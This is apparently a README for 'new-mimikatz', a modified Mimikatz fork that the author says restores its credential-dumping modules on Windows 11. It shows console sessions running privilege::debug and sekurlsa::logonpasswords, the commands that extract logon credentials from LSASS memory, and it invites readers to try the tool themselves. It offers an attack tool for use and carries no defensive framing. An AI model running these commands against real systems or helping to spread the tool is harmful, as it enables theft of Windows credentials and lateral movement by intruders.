# new-mimikatz
```
   ,--.,--.                                                                      
  (  0 \   \     Mimi now works fully on Windows 11                              
  //_   `   |    Now it's time to use kiwi bird instead of kiwi fruit            
 /' |       |                                                                    
'    \      ;    Made With LOVE <3                                               
   __|`--\,/     OldCreator                                                      
    /\    |      https://github.com/old-creator                                  
         ~|~                                                                     
```

One of the problems that I was always upset about was that some **Mimikatz** modules did not work on Windows 11!

For example, when I tried to use the **sekurlsa** module, I encountered this error :(

```

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz #
```

I always thought that it was impossible to solve this problem, but recently I realized that I can solve this problem by making small changes, so I started working!

```
   ,--.,--.
  (  0 \   \     Mimi now works fully on Windows 11
  //_   `   |    Now it's time to use kiwi bird instead of kiwi fruit
 /' |       |
'    \      ;    Made With LOVE <3
   __|`--\,/     OldCreator
    /\    |      https://github.com/old-creator
         ~|~

New-Mimikatz # privilege::debug
Privilege '20' OK

New-Mimikatz # sekurlsa::logonpasswords

** Try it yourself **
```
